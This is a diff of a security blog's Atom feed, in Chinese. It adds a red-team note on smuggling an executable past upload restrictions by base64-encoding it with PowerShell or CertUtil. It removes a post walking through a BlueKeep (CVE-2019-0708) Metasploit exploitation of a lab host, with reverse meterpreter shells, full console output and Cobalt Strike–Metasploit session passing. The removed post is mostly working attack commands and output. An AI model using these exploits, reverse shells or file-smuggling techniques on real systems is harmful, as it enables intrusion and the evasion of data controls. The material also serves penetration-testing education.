@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-06-30T03:38:23.606Z</updated>
+  <updated>2021-07-01T13:23:56.199Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【内网学习笔记】13、内网中绕过无法上传文件限制</title>
+    <link href="https://www.teamssix.com/year/210701-161347.html"/>
+    <id>https://www.teamssix.com/year/210701-161347.html</id>
+    <published>2021-07-01T08:13:47.000Z</published>
+    <updated>2021-07-01T13:23:56.199Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p><pre><code>$PEBytes = [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)$Base64Payload = [System.Convert]::ToBase64String($PEBytes)Set-Content fscan_base64.txt -Value $Base64Payload</code></pre><p>使用 PowerShell 进行 base64 解码</p><pre><code>$Base64Bytes = Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630172410.png"></p><h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p><p>使用 CertUtil 进行编码</p><pre><code>CertUtil -encode fscan.exe fscan_base64.txt</code></pre><p>使用 CertUtil 进行解码</p><pre><code>CertUtil -decode fscan_base64.txt fscan_base64.exe</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630173155.png"> </p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a></p><p><a href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;1、前言&quot;&gt;&lt;a href=&quot;#1、前言&quot; class=&quot;headerlink&quot; title=&quot;1、前言&quot;&gt;&lt;/a&gt;1、前言&lt;/h2&gt;&lt;p&gt;有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe </summary>
+      
+    
+    
+    
+    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
+    
+    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
   
   <entry>
     <title>【内网学习笔记】两种突破内网中无法上传大文件的方法</title>
@@ -555,34 +583,6 @@
     <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
     
     <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【经验总结】CS与MSF之间的会话传递</title>
-    <link href="https://www.teamssix.com/year/210129-191714.html"/>
-    <id>https://www.teamssix.com/year/210129-191714.html</id>
-    <published>2021-01-29T11:17:14.000Z</published>
-    <updated>2021-01-29T07:33:21.636Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为 Metasploit  Framework 的图形界面版，因此 Cobalt Strike 与 Metasploit  Framework 在很多地方都是兼容的，所以我们便可以将 Metasploit  Framework 攻击产生的会话传递到 Cobalt Strike 上，同样的 Cobalt Strike 的会话也能够传递到 Metasploit  Framework</p><p><strong>Metasploit  Framework 会话传递到 Cobalt Strike 上整体过程如下：</strong></p><p>1、Metasploit Framework 调用攻击载荷，这里调用的是喜闻乐见的 CVE-2019-0708</p><p>2、Metasploit Framework 发起攻击，获取会话</p><p>3、Cobalt Strike 新建一个 Beacon，这里使用的是 HTTPS Beacon</p><p>4、最后，在 Metasploit Framework 上调用 exploit/windows/local/payload_inject 模块</p><p>5、在该模块上配置与 Cobalt Strike 上为同样类型的 payload，即 HTTPS Payload，设置 Cobalt Strike 服务器的 IP 和 端口后运行即可</p><p><strong>Cobalt Strike 会话传递到 Metasploit  Framework 上整体过程如下：</strong></p><p>1、首先，Cobalt Strike 需要获得一个会话，这里直接采用 Scripted Web Delivery（S）的方式使靶机上线</p><p>2、接着，Metasploit Framework 调用 exploit/multi/handler 模块</p><p>3、在该模块上配置 HTTP Payload，为该 payload 的 IP 和 端口设置成 Metasploit Framework 所在主机 IP，端口自定义即可</p><p>4、 之后运行该模块</p><p>5、在 Cobalt Strike 上创建一个 Foreign HTTP 的监听，监听 IP 和端口设置成刚才 Metasploit Framework 上所监听的 IP 和端口</p><p>7、接着在 Cobalt Strike 上右击选择要传递的会话，找到 Spawn 选项，选择刚刚创建的监听器即可</p><blockquote><p>环境信息：</p><p>攻击 IP：192.168.175.200 （Cobalt Strike 服务端、Metasploit Framework 所在主机）</p><p>靶机 IP：192.168.175.177 （一台有 CVE-2019-0708 漏洞的 Win7 SP1 64 位靶机）</p></blockquote><h1 id="0x01-Metasploit-Framework-会话传递到-Cobalt-Strike"><a href="#0x01-Metasploit-Framework-会话传递到-Cobalt-Strike" class="headerlink" title="0x01 Metasploit Framework 会话传递到 Cobalt Strike"></a>0x01 Metasploit Framework 会话传递到 Cobalt Strike</h1><h2 id="1、Cobalt-Strike-上的操作"><a href="#1、Cobalt-Strike-上的操作" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>首先来到 Cobalt Strike 目录下，启动 Cobalt Strike 服务端</p><pre><code>./teamserver yourip yourpassword</code></pre><p>之后打开 Cobalt Strike 客户端进行连接</p><pre><code>./start.sh</code></pre><p>输入服务端密码连接上之后，点击 Cobalt Strike –&gt; Listeners 打开 Listeners 界面，点击下方的 Add 按钮，输入 Beacon 名称，这里选择的是 HTTPS Beacon，添加上主机 IP，点击保存，即可创建一个 HTTPS Beacon</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-24_20-07-57.png"></p><h2 id="2、Metasploit-Framework-上的操作"><a href="#2、Metasploit-Framework-上的操作" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，打开 Metasploit Framework</p><pre><code>msfconsole </code></pre><p>调用 CVE-2019-0708 模块</p><pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></pre><p>设置靶机 IP</p><pre><code>set rhost 192.168.175.177</code></pre><p>设置 Payload</p><pre><code>set payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.175.200</code></pre><p>发起攻击</p><pre><code>exploit</code></pre><p>整体过程如下：</p><pre><code>root@kali:~# msfconsolemsf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rcemsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhost 192.168.175.177rhost =&gt; 192.168.175.177msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set lhost 192.168.175.200lhost =&gt; 192.168.175.200msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit[*] Started reverse TCP handler on 192.168.175.200:4444 [*] 192.168.175.177:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check[+] 192.168.175.177:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.[*] 192.168.175.177:3389  - Scanned 1 of 1 hosts (100% complete)[*] 192.168.175.177:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.[!] 192.168.175.177:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;[*] 192.168.175.177:3389 - Surfing channels ...[*] 192.168.175.177:3389 - Lobbing eggs ...[*] 192.168.175.177:3389 - Forcing the USE of FREE&#39;d object ...[!] 192.168.175.177:3389 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;[*] Sending stage (206403 bytes) to 192.168.175.177[*] Meterpreter session 4 opened (192.168.175.200:4444 -&gt; 192.168.175.177:49167) at 2020-07-26 05:57:22 -0400meterpreter &gt; </code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_17-57-47.png"></p><h2 id="3、开始传递会话"><a href="#3、开始传递会话" class="headerlink" title="3、开始传递会话"></a>3、开始传递会话</h2><p>首先，backgroud 会话</p><pre><code>background</code></pre><p>调用 payload_inject 模块</p><pre><code>use exploit/windows/local/payload_inject</code></pre><p>设置 HTTPS Payload</p><pre><code>set payload windows/meterpreter/reverse_https</code></pre><p>设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口</p><pre><code>set lhost 192.168.175.200set lport 443</code></pre><p>设置 DisablePayloadHandler 为 True，此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。</p><pre><code>set DisablePayloadHandler True</code></pre><p>（可选）设置 PrependMigrate 为 True，此选项让 Metasploit Framework 前置 shellcode 在另一个进程中运行 payload stager，如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p><pre><code>set PrependMigrate True</code></pre><p>设置要传递的会话 session，如果不知道自己的 session id，可以通过 sessions -l 查看，我这里待传递的 session id 为 4</p><pre><code> set session 4</code></pre><p>开始会话传递</p><pre><code>run</code></pre><p>整体过程如下：</p><pre><code>msf5 &gt; background [*] Backgrounding session 4...msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; use exploit/windows/local/payload_injectmsf5 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_httpspayload =&gt; windows/meterpreter/reverse_httpsmsf5 exploit(windows/local/payload_inject) &gt; set lhost 192.168.175.200lhost =&gt; 192.168.175.200msf5 exploit(windows/local/payload_inject) &gt; set lport 443lport =&gt; 443msf5 exploit(windows/local/payload_inject) &gt; set DisablePayloadHandler TrueDisablePayloadHandler =&gt; truemsf5 exploit(windows/local/payload_inject) &gt; set PrependMigrate TruePrependMigrate =&gt; Truemsf5 exploit(windows/local/payload_inject) &gt;  set session 4session =&gt; 4msf5 exploit(windows/local/payload_inject) &gt; run[*] Running module against WIN-T0UES7KBMJ5[*] Spawned Notepad process 544[*] Injecting payload into 544[*] Preparing &#39;windows/meterpreter/reverse_https&#39; for PID 544</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png"></p><p>此时，来到 Cobalt Strike 下已经可以看到传递过来的会话了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-08-39.png"></p><h1 id="0x02-Cobalt-Strike-会话传递到-Metasploit-Framework"><a href="#0x02-Cobalt-Strike-会话传递到-Metasploit-Framework" class="headerlink" title="0x02 Cobalt Strike 会话传递到 Metasploit Framework"></a>0x02 Cobalt Strike 会话传递到 Metasploit Framework</h1><h2 id="1、Cobalt-Strike-上的操作-1"><a href="#1、Cobalt-Strike-上的操作-1" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>与上述 Cobalt Strike 的操作步骤一样，这里先创建一个 HTTPS Beacon，接下来创建一个 Powershell 类型的 Scripted Web Delivery（S）</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-27-02.png">为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-30-31.png"></p><h2 id="2、Metasploit-Framework-上的操作-1"><a href="#2、Metasploit-Framework-上的操作-1" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，在 Metasploit Framework 上调用 handler 模块</p><pre><code>use exploit/multi/handler</code></pre><p>设置 HTTP Payload</p><pre><code>set payload windows/meterpreter/reverse_httpset lhost 192.168.175.200set lport 4480</code></pre><p>运行该模块</p><pre><code>run</code></pre><p>整体过程如下：</p><pre><code>msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_httppayload =&gt; windows/meterpreter/reverse_httpmsf5 exploit(multi/handler) &gt; set lhost 192.168.175.200lhost =&gt; 192.168.175.200msf5 exploit(multi/handler) &gt; set lport 4480lport =&gt; 4480msf5 exploit(multi/handler) &gt; run[*] Started HTTPS reverse handler on http://192.168.175.200:4480</code></pre><h2 id="3、开始会话传递"><a href="#3、开始会话传递" class="headerlink" title="3、开始会话传递"></a><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-35-45.png">3、开始会话传递</h2><p>在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-39-58.png"></p><p>之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-54-23.png"></p><p>来到 Metasploit Framework 便能够看到会话已经传递过来了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-57-35.png"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为</summary>
-      
-    
-    
-    
-    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
-    
-    
-    <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
-    
-    <category term="MSF" scheme="https://www.teamssix.com/tags/MSF/"/>
-    
-    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
     
   </entry>
   
